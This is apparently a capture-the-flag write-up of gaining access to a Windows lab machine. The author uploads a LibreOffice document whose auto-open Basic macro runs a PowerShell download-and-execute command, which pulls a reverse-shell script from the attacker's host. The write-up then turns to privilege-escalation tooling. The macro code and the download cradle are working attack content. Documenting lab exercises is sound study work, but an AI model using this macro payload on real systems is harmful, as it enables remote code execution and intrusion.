```

From the scan we can tell that only one tcp port is open

I'll head over to see what it is

It doesn't contain anything much looking below shows a file upload form

Uploading any file shows that it only accepts a .odt file 
![image](https://user-images.githubusercontent.com/113513376/221056229-d2f6ed55-35af-41c1-8eb0-7cbf5839908a.png)

After trying to upload a fake .odt file shows that it will be viewed soon

So with this we know that we can upload a .odt file which is just like an excel spreadsheet

But lets say if we manage to even upload a .php file we won't be able to execute it cause its been viewed by a person (bot)

Now we can perform a macros attack

Which basically puts in a malicious content in the file then after it is being viewed the macros content will be executed

### Payload Creation 

Here's what i'll do 
![image](https://0xdf.gitlab.io/img/image-20191126164802663.png)

```
I’ll open Calc, and go to Tools –> Macros –> Organize Macros –> LibreOffice Basic:
```

In the dialog box that pops up, I’ll select the document I’m working in on the left side (Untitled 1) and click “New”. I’ll give the module a name (“evil”), and click Ok to be taken to the macro editor:
![image](https://user-images.githubusercontent.com/113513376/221057141-7fc7502d-b1de-44bf-8b28-656672c72fda.png)

OpenOffice macros use Basic, a similar but [slightly different](https://wiki.openoffice.org/wiki/Documentation/FAQ/Macros/Can_I_use_my_Microsoft_Office_macros%3F) language to the VBA that’s in MS macros. To run a command on a Windows host from LibreOffice Basic, I’ll need to put it into Shell() as a string. So I wrap my command in "". To nest quotes, I’ll use two double quotes (""). I’ll call Shell to execute some simple download and execute code:

```
REM  *****  BASIC  *****

Sub Main

    Shell("cmd /c powershell ""IEX(New-Object Net.Webclient).downloadString('http://192.168.45.5/Invoke-PowerShellTcp.ps1')""")
    
End Sub
```

#### AutoOpen

Now I need to make sure this macro is run when the document is opened. I'll close the macro editors, and back in the document, go to Tools –> Customize -> Events tab:

I'll select "Open Document" and click on the "Macro…" button. I'll navigte to select my macro:

When I hit "OK", I see it now in the list:
![image](https://user-images.githubusercontent.com/113513376/221059503-f810f247-f894-461d-9aa4-bde2e5a4805b.png)

I'll save my sheet as shell.ods, and exit LibreOffice.

Reference to this [0xdf](https://0xdf.gitlab.io/2020/02/01/htb-re.html)

Cool with this payload i'll set up a listener on port 1337 and a http server on port 80 hosting a powershell reverse shell

I will rename shell.ods file to shell.odt

After uploading the shell.odt file i get back a connection after few seconds

Lets escalate priv 🤓

Uploading WinPEAS.exe and running it

It shows that two printer services are running i'll get a shell via msf then run exploit suggester
